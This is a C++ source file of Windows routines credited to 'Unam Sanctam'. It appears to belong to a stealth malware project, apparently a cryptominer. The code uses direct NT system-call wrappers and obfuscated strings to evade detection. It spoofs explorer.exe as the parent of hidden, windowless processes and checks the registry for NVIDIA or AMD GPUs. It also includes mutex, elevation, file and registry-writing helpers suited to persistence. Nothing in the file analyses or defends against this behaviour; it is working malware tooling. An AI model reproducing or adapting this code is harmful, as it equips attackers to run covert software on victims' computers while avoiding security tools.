#include "common.h"

#include "ntddk.h"
#include "obfuscateu.h"

#include <wchar.h>

PROCESS_INFORMATION create_new_process_internal(LPWSTR programPath, LPWSTR cmdLine, LPWSTR startDir, LPWSTR runtimeData, DWORD processFlags, DWORD threadFlags) {
	/* 
		Custom NtCreateUserProcess creation painstakingly made by Unam Sanctam https://github.com/UnamSanctam
	*/
    HANDLE hParent = NULL;
    PVOID buffer = NULL;
    SIZE_T bufferLength = 0;
    NTSTATUS status = -1;
    while (true) {
        status = UtQuerySystemInformation(SystemProcessInformation, buffer, (ULONG)bufferLength, (PULONG)&bufferLength);
        if (status != STATUS_INFO_LENGTH_MISMATCH) {
            break;
        }
        UtAllocateVirtualMemory(UtCurrentProcess(), &buffer, 0, &bufferLength, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    }
	if (NT_SUCCESS(status))
	{
        ULONG ofs = 0;
		while (true)
		{
			PSYSTEM_PROCESS_INFORMATION pspi = (PSYSTEM_PROCESS_INFORMATION)((BYTE*)buffer + ofs);
			if (pspi->ImageName.Length > 0 && !wcsncmp(pspi->ImageName.Buffer, AYU_OBFUSCATEW(L"explorer.exe"), 12)) {
                OBJECT_ATTRIBUTES oa;
		        InitializeObjectAttributes(&oa, 0, 0, 0, 0);
		        CLIENT_ID id = { pspi->UniqueProcessId, NULL };

		        if (NT_SUCCESS(UtOpenProcess(&hParent, PROCESS_CREATE_PROCESS, &oa, &id))) {
                    break;
		        }
            }
			
			if (!pspi->NextEntryOffset || ofs + pspi->NextEntryOffset >= bufferLength) {
				break;
			}
			ofs += pspi->NextEntryOffset;
		}
	}
    UtFreeVirtualMemory(UtCurrentProcess(), &buffer, &bufferLength, MEM_RELEASE);

    if (hParent == NULL) {
        hParent = UtCurrentProcess();
    }

    HANDLE hToken = NULL;
	UtOpenProcessToken(UtCurrentProcess(), TOKEN_ASSIGN_PRIMARY, &hToken);

	PUT_PEB_EXT PebExt = (PUT_PEB_EXT)SWU_GetPEB();
	PRTL_USER_PROCESS_PARAMETERS CurProcessParameters = PebExt->ProcessParameters;

    UNICODE_STRING nt_program_path, start_directory, command_line, ShellInfo;

    wchar_t ntPath[MAX_PATH+4] = { 0 };
    combine_path(ntPath, AYU_OBFUSCATEW(L"\\??\\"), programPath);
    INIT_UNICODE_STRING(nt_program_path, ntPath, MAX_PATH+4);
    if (startDir) {
        INIT_UNICODE_STRING(start_directory, startDir, MAX_PATH);
	}
	else {
		start_directory = CurProcessParameters->CurrentDirectory.DosPath;
	}
    if (cmdLine) {
        INIT_UNICODE_STRING(command_line, cmdLine, MAX_COMMAND_LENGTH);
	}
	else {
		command_line = nt_program_path;
	}

	wchar_t emptyChar[1] = { 0 };
    if (runtimeData) {
        INIT_UNICODE_STRING(ShellInfo, runtimeData, wcslen(runtimeData));
    }
    else {
        INIT_UNICODE_STRING(ShellInfo, emptyChar, 1);
    }

    ULONG totalsize = 0;
	totalsize += sizeof(RTL_USER_PROCESS_PARAMETERS);
	totalsize += start_directory.Length;
	totalsize += nt_program_path.Length;
	totalsize += CurProcessParameters->DllPath.Length;
	totalsize += command_line.Length;
    totalsize += ShellInfo.Length;
	totalsize += 6;

    PVOID ProcessParametersData = NULL;
    SIZE_T ProcessParametersSize = totalsize;
    UtAllocateVirtualMemory(UtCurrentProcess(), &ProcessParametersData, 0, &ProcessParametersSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	PRTL_USER_PROCESS_PARAMETERS ProcessParameters = (RTL_USER_PROCESS_PARAMETERS*)ProcessParametersData;
	ProcessParameters->MaximumLength = totalsize;
	ProcessParameters->Length = totalsize;
	ProcessParameters->Flags = 1;
    ProcessParameters->ConsoleHandle = HANDLE_CREATE_NO_WINDOW;
	ProcessParameters->CurrentDirectory.DosPath = start_directory;
	ProcessParameters->DllPath = CurProcessParameters->DllPath;
	ProcessParameters->ImagePathName = nt_program_path;
	ProcessParameters->CommandLine = command_line;
	ProcessParameters->Environment = CurProcessParameters->Environment;
	ProcessParameters->ShellInfo = ShellInfo;
	ProcessParameters->EnvironmentSize = CurProcessParameters->EnvironmentSize;

    PS_CREATE_INFO CreateInfo = { 0 };
	CreateInfo.Size = sizeof(CreateInfo);
	CreateInfo.State = PsCreateInitialState;

	PVOID AttributeListData = NULL;
    SIZE_T AttributeListSize = sizeof(PS_ATTRIBUTE) * 3;
    UtAllocateVirtualMemory(UtCurrentProcess(), &AttributeListData, 0, &AttributeListSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    PPS_ATTRIBUTE_LIST AttributeList = (PS_ATTRIBUTE_LIST*)AttributeListData;
	AttributeList->TotalLength = sizeof(PS_ATTRIBUTE_LIST);

	AttributeList->Attributes[0].Attribute = 0x20005;
	AttributeList->Attributes[0].Size = nt_program_path.Length;
	AttributeList->Attributes[0].u1.Value = (ULONG_PTR)nt_program_path.Buffer;

    AttributeList->Attributes[1].Attribute = 0x60000;
    AttributeList->Attributes[1].Size = sizeof(HANDLE);
    AttributeList->Attributes[1].u1.ValuePtr = hParent;

    AttributeList->Attributes[2].Attribute = 0x60002;
	AttributeList->Attributes[2].Size = sizeof(HANDLE);
	AttributeList->Attributes[2].u1.ValuePtr = hToken;

    HANDLE hProcess, hThread = NULL;
	UtCreateUserProcess(&hProcess, &hThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, processFlags, threadFlags, ProcessParameters, &CreateInfo, AttributeList);

	UtFreeVirtualMemory(UtCurrentProcess(), &ProcessParametersData, &ProcessParametersSize, MEM_RELEASE);
	UtFreeVirtualMemory(UtCurrentProcess(), &AttributeListData, &AttributeListSize, MEM_RELEASE);

    PROCESS_INFORMATION pi = { hProcess, hThread };

    return pi;
}

bool has_gpu() {
    UNICODE_STRING regKey;
    INIT_UNICODE_STRING(regKey, AYU_OBFUSCATEW(L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\Class\\{4d36e968-e325-11ce-bfc1-08002be10318}\\"), MAX_PATH);
    UNICODE_STRING providerKey;
    INIT_UNICODE_STRING(providerKey, AYU_OBFUSCATEW(L"ProviderName"), MAX_PATH);

    HANDLE hKey = NULL;
    ULONG infoLength;
    BYTE subKeyBuffer[256];
    BYTE valueBuffer[512];
    OBJECT_ATTRIBUTES attr;
    InitializeObjectAttributes(&attr, &regKey, OBJ_CASE_INSENSITIVE, NULL, NULL);
    if (NT_SUCCESS(UtOpenKey(&hKey, KEY_READ, &attr))) {
        for (ULONG i = 0; UtEnumerateKey(hKey, i, KeyBasicInformation, subKeyBuffer, sizeof(subKeyBuffer), &infoLength) != STATUS_NO_MORE_ENTRIES; ++i) {
            HANDLE hSubKey;
            INIT_UNICODE_STRING(regKey, ((PKEY_BASIC_INFORMATION)subKeyBuffer)->Name, ((PKEY_BASIC_INFORMATION)subKeyBuffer)->NameLength);
            InitializeObjectAttributes(&attr, &regKey, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, hKey, NULL);
            
            if (NT_SUCCESS(UtOpenKey(&hSubKey, KEY_READ, &attr))) {
                if (NT_SUCCESS(UtQueryValueKey(hSubKey, &providerKey, KeyValueFullInformation, valueBuffer, sizeof(valueBuffer), &infoLength))) {
                    wchar_t* providerName = (wchar_t*)((BYTE*)valueBuffer + ((PKEY_VALUE_FULL_INFORMATION)valueBuffer)->DataOffset);
                    if (wcsnicmp(providerName, AYU_OBFUSCATEW(L"NVIDIA"), 6) == 0 ||
                        wcsnicmp(providerName, AYU_OBFUSCATEW(L"AMD"), 3) == 0 ||
                        wcsnicmp(providerName, AYU_OBFUSCATEW(L"ATI"), 3) == 0 ||
                        wcsstr(providerName, AYU_OBFUSCATEW(L"Advanced Micro Devices")) != NULL)
                    {
                        UtClose(hSubKey);
                        UtClose(hKey);
                        return true;
                    }
                }
                UtClose(hSubKey);
            }
        }
        UtClose(hKey);
    }
    return false;
}

void run_program(bool wait, wchar_t* startDir, wchar_t* programPath, wchar_t* cmdLine, ...) {
    wchar_t cmdLineFormatted[MAX_COMMAND_LENGTH] = { 0 };
    va_list argptr;
    va_start(argptr, cmdLine);
    vswprintf(cmdLineFormatted, MAX_COMMAND_LENGTH, cmdLine, argptr);
    va_end(argptr);
    PROCESS_INFORMATION pi = create_new_process_internal(programPath, cmdLineFormatted, startDir, nullptr, 0, 0);
	if(wait) {
        LARGE_INTEGER waittime;
        waittime.QuadPart = -(30000 * 10000);
		UtWaitForSingleObject(pi.hProcess, FALSE, &waittime);
	}
	UtClose(pi.hProcess);
}

bool check_mutex(wchar_t* mutex) {
    bool mutexActive = false;
    if (mutex != NULL) {
        HANDLE hMutex = NULL;

        UNICODE_STRING umutex;
        INIT_UNICODE_STRING(umutex, mutex, MAX_PATH);

        OBJECT_ATTRIBUTES attr;
        InitializeObjectAttributes(&attr, &umutex, 0, NULL, NULL);

        NTSTATUS status = UtCreateMutant(&hMutex, MUTANT_ALL_ACCESS, &attr, FALSE);

        mutexActive = !NT_SUCCESS(status) || hMutex == INVALID_HANDLE_VALUE || hMutex == NULL;
        UtClose(hMutex);
    }
    return mutexActive;
}

IO_STATUS_BLOCK status_block = { 0 };

void combine_path(wchar_t* src, wchar_t* base_path, wchar_t* ext_path) {
    wcscpy(src, base_path);
    wcscat(src, ext_path);
}

wchar_t* get_env(wchar_t* env, wchar_t* env_name) {
    size_t env_name_len = wcslen(env_name);
    for (; *env; env += wcslen(env) + 1) {
        if (wcsnicmp(env, env_name, env_name_len) == 0) {
            return env + env_name_len;
        }
    }
    return nullptr;
}

void ntpath_obj_attr(POBJECT_ATTRIBUTES attr, PUNICODE_STRING unicode_path, wchar_t* path) {
    wchar_t ntPath[MAX_PATH+4] = { 0 };
    combine_path(ntPath, AYU_OBFUSCATEW(L"\\??\\"), path);

    INIT_PUNICODE_STRING(unicode_path, ntPath);
    InitializeObjectAttributes(attr, unicode_path, OBJ_CASE_INSENSITIVE, NULL, NULL);
}

HANDLE create_directory(wchar_t* dir_path) {
    OBJECT_ATTRIBUTES attr = { 0 };
    UNICODE_STRING unicode_path;
    ntpath_obj_attr(&attr, &unicode_path, dir_path);

    HANDLE file;
    if (!NT_SUCCESS(UtCreateFile(&file,
        FILE_GENERIC_WRITE,
        &attr,
        &status_block,
        NULL,
        FILE_ATTRIBUTE_NORMAL,
        0,
        FILE_OPEN_IF,
        FILE_DIRECTORY_FILE,
        NULL,
        0
    ))) {
        return INVALID_HANDLE_VALUE;
    }
    return file;
}

void create_recursive_directory(wchar_t* dir_path) {
    size_t len = wcslen(dir_path);
    for (size_t i = 0; i <= len; i++) {
        if (dir_path[i] == L'\\' || dir_path[i] == L'/') {
            wchar_t* part_path = new wchar_t[len + 1];
            wcscpy(part_path, dir_path);
            part_path[i] = L'\0';
            UtClose(create_directory(part_path));
        }
    }
}

HANDLE create_file(wchar_t* file_path) {
    OBJECT_ATTRIBUTES attr = { 0 };
    UNICODE_STRING unicode_path;
    ntpath_obj_attr(&attr, &unicode_path, file_path);

    HANDLE file;
    if (!NT_SUCCESS(UtCreateFile(&file,
        DELETE | SYNCHRONIZE | GENERIC_READ | GENERIC_WRITE,
        &attr,
        &status_block,
        NULL,
        FILE_ATTRIBUTE_NORMAL,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        FILE_SUPERSEDE,
        FILE_SYNCHRONOUS_IO_NONALERT,
        NULL,
        0
    ))) {
        return INVALID_HANDLE_VALUE;
    }
    return file;
}

HANDLE open_file(wchar_t* file_path, bool read_only) {
    OBJECT_ATTRIBUTES attr = { 0 };
    UNICODE_STRING unicode_path;
    ntpath_obj_attr(&attr, &unicode_path, file_path);

    HANDLE file;
    NTSTATUS stat;
    if (read_only) {
        stat = UtOpenFile(&file,
            SYNCHRONIZE | GENERIC_READ,
            &attr,
            &status_block,
            FILE_SHARE_READ,
            FILE_SYNCHRONOUS_IO_NONALERT
        );
    }else{
        stat = UtOpenFile(&file,
            DELETE | SYNCHRONIZE | GENERIC_READ | GENERIC_WRITE,
            &attr,
            &status_block,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            FILE_SUPERSEDE | FILE_SYNCHRONOUS_IO_NONALERT
        );
    }
    if (!NT_SUCCESS(stat)) {
        return INVALID_HANDLE_VALUE;
    }

    return file;
}

PVOID read_file(wchar_t* filePath, ULONG* outFileSize) {
    HANDLE hFile = open_file(filePath, true);
    if (hFile == INVALID_HANDLE_VALUE) {
        return NULL;
    }

    FILE_STANDARD_INFORMATION fileInfo = { 0 };
    if (!NT_SUCCESS(UtQueryInformationFile(hFile, &status_block, &fileInfo, sizeof(fileInfo), FileStandardInformation))) {
        UtClose(hFile);
        return NULL;
    }

    *outFileSize = fileInfo.EndOfFile.QuadPart;
    PVOID fileData = NULL;

    SIZE_T allocatedSize = fileInfo.EndOfFile.QuadPart;
    NTSTATUS astatus = UtAllocateVirtualMemory(UtCurrentProcess(), &fileData, 0, &allocatedSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (!NT_SUCCESS(astatus)) {
        UtClose(hFile);
        *outFileSize = 0;
        return NULL;
    }

    NTSTATUS status = UtReadFile(
        hFile,
        NULL,
        NULL,
        NULL,
        &status_block,
        fileData,
        *outFileSize,
        NULL,
        NULL
    );

    UtClose(hFile);
    if (!NT_SUCCESS(status)) {
        *outFileSize = 0;
        return NULL;
    }

    return fileData;
}

bool write_file(wchar_t* file_path, PVOID paylad_buf, ULONG payload_size) {
    create_recursive_directory(file_path);
    HANDLE hFile = create_file(file_path);
    if (hFile == INVALID_HANDLE_VALUE) {
        return false;
    }

    NTSTATUS status = UtWriteFile(
        hFile,
        NULL,
        NULL,
        NULL,
        &status_block,
        paylad_buf,
        payload_size,
        NULL,
        NULL
    );

    UtClose(hFile);
    if (!NT_SUCCESS(status)) {
        return false;
    }
    return true;
}

bool delete_file(wchar_t* file_path) {
    OBJECT_ATTRIBUTES attr = { 0 };
    UNICODE_STRING unicode_path;
    ntpath_obj_attr(&attr, &unicode_path, file_path);
    return NT_SUCCESS(UtDeleteFile(&attr));
}

bool check_file_exists(wchar_t* file_path) {
    OBJECT_ATTRIBUTES attr = { 0 };
    UNICODE_STRING unicode_path;
    ntpath_obj_attr(&attr, &unicode_path, file_path);
    FILE_BASIC_INFORMATION file_info;
    return NT_SUCCESS(UtQueryAttributesFile(&attr, &file_info));
}

bool check_administrator() {
    HANDLE hToken = NULL;
	UtOpenProcessToken(UtCurrentProcess(), TOKEN_QUERY, &hToken);
    TOKEN_ELEVATION elevation;
    ULONG ul;
    if (hToken && NT_SUCCESS(UtQueryInformationToken(hToken, TokenElevation, &elevation, sizeof(elevation), &ul))) {
        return elevation.TokenIsElevated;
    }
    return false;
}

bool set_value_registry(wchar_t* key, wchar_t* value, ULONG type, PVOID data, ULONG datasize) {
    UNICODE_STRING ukey;
    INIT_UNICODE_STRING(ukey, key, MAX_PATH);

    OBJECT_ATTRIBUTES attr;
    InitializeObjectAttributes(&attr, &ukey, OBJ_CASE_INSENSITIVE, NULL, NULL);

    bool success = false;

    ULONG vDisp = 0;
    HANDLE hKey = NULL;
    if (NT_SUCCESS(UtCreateKey(&hKey, KEY_WRITE, &attr, 0, NULL, REG_OPTION_NON_VOLATILE, &vDisp))) {
        UNICODE_STRING uvalue;
        INIT_UNICODE_STRING(uvalue, value, MAX_PATH);

        success = NT_SUCCESS(UtSetValueKey(hKey, &uvalue, 0, type, data, datasize));
    }
    UtClose(hKey);
    return success;
}

bool check_key_registry(wchar_t* key) {
    UNICODE_STRING ukey;
    INIT_UNICODE_STRING(ukey, key, MAX_PATH);
    OBJECT_ATTRIBUTES attr;
    InitializeObjectAttributes(&attr, &ukey, OBJ_CASE_INSENSITIVE, NULL, NULL);

    HANDLE hKey = NULL;
    bool success = NT_SUCCESS(UtOpenKey(&hKey, STANDARD_RIGHTS_READ, &attr));
    UtClose(hKey);
    return success;
}

bool rename_key_registry(wchar_t* current_key, wchar_t* new_key) {
    UNICODE_STRING ukey;
    INIT_UNICODE_STRING(ukey, current_key, MAX_PATH);

    UNICODE_STRING unewkey;
    INIT_UNICODE_STRING(unewkey, new_key, MAX_PATH);

    OBJECT_ATTRIBUTES attr;
    InitializeObjectAttributes(&attr, &ukey, OBJ_CASE_INSENSITIVE, NULL, NULL);

    bool success = false;

    HANDLE hKey = NULL;
    if (NT_SUCCESS(UtOpenKey(&hKey, KEY_WRITE | KEY_CREATE_SUB_KEY | DELETE, &attr))) {
        success = NT_SUCCESS(UtRenameKey(hKey, &unewkey));
    }
    UtClose(hKey);
    return success;
}

bool delete_key_registry(wchar_t* key) {
    UNICODE_STRING ukey;
    INIT_UNICODE_STRING(ukey, key, MAX_PATH);

    OBJECT_ATTRIBUTES attr;
    InitializeObjectAttributes(&attr, &ukey, OBJ_CASE_INSENSITIVE, NULL, NULL);

    bool success = false;

    HANDLE hKey = NULL;
    if (NT_SUCCESS(UtOpenKey(&hKey, DELETE, &attr))) {
        success = NT_SUCCESS(UtDeleteKey(hKey));
    }
    UtClose(hKey);
    return success;
}